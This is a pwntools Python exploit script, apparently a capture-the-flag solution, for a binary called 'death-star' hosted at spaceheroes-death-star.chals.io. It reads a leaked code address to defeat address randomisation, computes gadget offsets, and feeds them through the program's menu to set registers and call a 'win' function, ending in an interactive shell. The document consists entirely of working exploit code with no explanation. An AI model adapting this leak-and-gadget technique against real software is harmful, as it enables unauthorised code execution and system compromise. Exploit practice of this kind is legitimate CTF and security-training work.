from pwn import *

e = ELF(args.BIN)

if args.REMOTE:
    p = remote("spaceheroes-death-star.chals.io", 443, ssl=True, sni="spaceheroes-death-star.chals.io")
else:
    p = process(args.BIN)



# Leak
log.info('[+] Obtaining Leak')
p.sendline(b'1')
p.recvuntil(b'BESPIN')
p.sendline(b'1')
p.recvuntil(b'Fire')
p.sendline(b'2')
p.recvuntil(b'Target Coordinates => ')
leak = int(p.recvline().strip()) - 0x1345
log.info(f'[!] Leak Obtained: {hex(leak)}')

# Gadgets
r13 = leak + 0x1517
r14 = leak + 0x150f
r15 = leak + 0x151f
win = leak + 0x152a

# Perform exploit

# set r13
log.info(f'[>] Sending r13 gadget: {hex(r13)}')
p.recvuntil(b'Fire')
p.sendline(b'1')
p.sendline(b'%i' %(r13))
p.recvuntil(b'Fire')
p.sendline(b'3')

# set r14
log.info(f'[>] Sending r14 gadget: {hex(r14)}')
p.recvuntil(b'Fire')
p.sendline(b'1')
p.sendline(b'%i' %(r14))
p.recvuntil(b'Fire')
p.sendline(b'3')
# set r15
log.info(f'[>] Sending r15 gadget: {hex(r15)}')
p.recvuntil(b'Fire')
p.sendline(b'1')
p.sendline(b'%i' %(r15))
p.recvuntil(b'Fire')
p.sendline(b'3')

# call win
log.info(f'[>] Calling win: {hex(win)}')
p.recvuntil(b'Fire')
p.sendline(b'1')
p.sendline(b'%i' %(win))
p.recvuntil(b'Fire')
p.sendline(b'3')

# shell time
log.info('[!] Shell acquired')
p.interactive()
